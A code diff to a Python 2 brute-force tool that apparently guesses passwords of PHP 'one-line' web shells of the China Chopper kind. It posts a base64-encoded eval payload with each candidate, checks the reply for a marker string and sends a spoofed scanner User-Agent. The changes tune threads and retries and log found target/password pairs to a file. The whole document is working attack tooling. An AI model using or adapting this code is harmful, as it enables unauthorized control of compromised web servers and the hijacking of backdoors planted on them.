@@ -4,8 +4,8 @@
 import urllib2
 import threading
 from   Queue     import  Queue
-from   os        import  _exit, getenv
-from   sys       import  argv, stdout
+from   os        import  getenv
+from   sys       import  argv, stdout, exit
 from   time      import  sleep
 
 print '''
@@ -26,22 +26,26 @@ class chopper( threading.Thread ):
 	def run( self ):
 		while 1:
 			if queue.empty()== True:
-				break
-			self.get_pass()
+				exit( 1 )
+			else:
+				self.password = str( queue.get() )
+				self.get_pass()
 	def get_pass( self ):
-		self.password = str( queue.get() )
 		flag = 1
-		while flag:
+		max_loop = 0
+		while flag and max_loop < 5:
 			try:
-				sleep( 3 )
+				max_loop += 1
 				opener = urllib2.urlopen( urllib2.Request( self.target, headers={ "User-Agent" : "Mozilla/5.0, they call me 360 web scanner" } ), data="%s=@eval( base64_decode($_POST[cj] ));&cj=ZWNobygiZ3JleSIpO2RpZSgpOw=="%self.password ,timeout=7 )
 				self.data = opener.read()
 				opener.close()
 				flag = 0
 				if "grey" in self.data:
 					print "\n\n[+] Found password -> "+self.password+"\n" if getenv( 'os' ).lower().startswith( 'win' ) else "\n\n[+] \033[1;2mFound password\033[0;92m -> \033[0m"+self.password+"\n"
-					_exit( 1 )
-					break
+					with open("yjh_found.log", "a") as yl:
+						yl.write("%s%9s\n"%(self.target, self.password))
+					exit( 1 )
+				sleep( 3 )
 			except:
 				pass
 
@@ -59,11 +63,12 @@ class Loading( threading.Thread ):
 			stdout.flush()
 			sleep( 1 )
 		print '\n[-] payload over'
+		exit( 1 )
 
 
 def work( target, password_list ):
 	print 'Target :         ',target
-	threads_num = 150; print 'Default threads :', threads_num
+	threads_num = 21; print 'Default threads :', threads_num
 
 	for i in password_list:
 		queue.put( i )
